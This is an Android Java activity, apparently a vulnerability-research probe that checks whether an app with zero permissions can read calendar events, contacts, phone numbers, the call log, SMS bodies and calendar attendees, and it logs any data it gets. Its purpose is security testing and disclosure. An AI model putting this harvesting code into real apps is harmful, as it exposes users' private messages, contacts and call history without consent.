package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class CalendarContactsLeakActivity extends Activity {
    private static final String T = "CAL_CONTACTS_LEAK";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Calendar & Contacts Zero-Perm Leak Test ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " PID=" + android.os.Process.myPid());
        Log.w(T, "ZERO PERMISSIONS — no READ_CALENDAR, no READ_CONTACTS");

        ContentResolver cr = getContentResolver();

        // Test 1: Calendar events
        Log.w(T, "--- TEST 1: Calendar Events ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.android.calendar/events"),
                new String[]{"_id", "title", "dtstart", "description", "eventLocation"},
                null, null, "_id DESC");
            if (c != null) {
                Log.w(T, "[+] Calendar cursor: " + c.getCount() + " rows");
                int count = 0;
                while (c.moveToNext() && count < 10) {
                    String id = c.getString(0);
                    String title = c.getString(1);
                    String dtstart = c.getString(2);
                    String desc = c.getString(3);
                    String loc = c.getString(4);
                    Log.w(T, "[+] Event: id=" + id + " title=" + title +
                        " date=" + dtstart + " loc=" + loc);
                    count++;
                }
                c.close();
                if (count > 0) {
                    Log.w(T, "[!!!] CONFIDENTIALITY VIOLATION: Calendar events readable without READ_CALENDAR");
                }
            } else {
                Log.w(T, "[-] Calendar query returned null cursor");
            }
        } catch (SecurityException e) {
            Log.w(T, "[-] Calendar blocked: " + e.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] Calendar error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test 2: Contacts
        Log.w(T, "--- TEST 2: Contacts ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"_id", "display_name", "has_phone_number"},
                null, null, null);
            if (c != null) {
                Log.w(T, "[+] Contacts cursor: " + c.getCount() + " rows");
                int count = 0;
                while (c.moveToNext() && count < 10) {
                    String id = c.getString(0);
                    String name = c.getString(1);
                    String hasPhone = c.getString(2);
                    Log.w(T, "[+] Contact: id=" + id + " name=" + name + " phone=" + hasPhone);
                    count++;
                }
                c.close();
                if (count > 0) {
                    Log.w(T, "[!!!] CONFIDENTIALITY VIOLATION: Contacts readable without READ_CONTACTS");
                }
            } else {
                Log.w(T, "[-] Contacts query returned null cursor");
            }
        } catch (SecurityException e) {
            Log.w(T, "[-] Contacts blocked: " + e.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] Contacts error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test 3: Phone numbers
        Log.w(T, "--- TEST 3: Phone Numbers ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.android.contacts/data/phones"),
                new String[]{"display_name", "data1"},
                null, null, null);
            if (c != null) {
                Log.w(T, "[+] Phones cursor: " + c.getCount() + " rows");
                while (c.moveToNext()) {
                    Log.w(T, "[+] Phone: " + c.getString(0) + " = " + c.getString(1));
                }
                c.close();
            }
        } catch (SecurityException e) {
            Log.w(T, "[-] Phones blocked: " + e.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] Phones error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test 4: Call log
        Log.w(T, "--- TEST 4: Call Log ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://call_log/calls"),
                new String[]{"number", "date", "type", "duration"},
                null, null, "date DESC");
            if (c != null) {
                Log.w(T, "[+] Call log cursor: " + c.getCount() + " rows");
                int count = 0;
                while (c.moveToNext() && count < 5) {
                    Log.w(T, "[+] Call: " + c.getString(0) + " type=" + c.getString(2));
                    count++;
                }
                c.close();
            }
        } catch (SecurityException e) {
            Log.w(T, "[-] Call log blocked: " + e.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] Call log error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test 5: SMS
        Log.w(T, "--- TEST 5: SMS ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://sms"),
                new String[]{"address", "body", "date"},
                null, null, "date DESC");
            if (c != null) {
                Log.w(T, "[+] SMS cursor: " + c.getCount() + " rows");
                int count = 0;
                while (c.moveToNext() && count < 5) {
                    Log.w(T, "[+] SMS from " + c.getString(0) + ": " + c.getString(1));
                    count++;
                }
                c.close();
            }
        } catch (SecurityException e) {
            Log.w(T, "[-] SMS blocked: " + e.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] SMS error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test 6: Calendar attendees
        Log.w(T, "--- TEST 6: Calendar Attendees ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.android.calendar/attendees"),
                new String[]{"attendeeEmail", "attendeeName", "event_id"},
                null, null, null);
            if (c != null) {
                Log.w(T, "[+] Attendees cursor: " + c.getCount() + " rows");
                int count = 0;
                while (c.moveToNext() && count < 10) {
                    Log.w(T, "[+] Attendee: " + c.getString(1) + " <" + c.getString(0) + ">");
                    count++;
                }
                c.close();
            }
        } catch (SecurityException e) {
            Log.w(T, "[-] Attendees blocked: " + e.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] Attendees error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        Log.w(T, "=== Test complete ===");
        finish();
    }
}
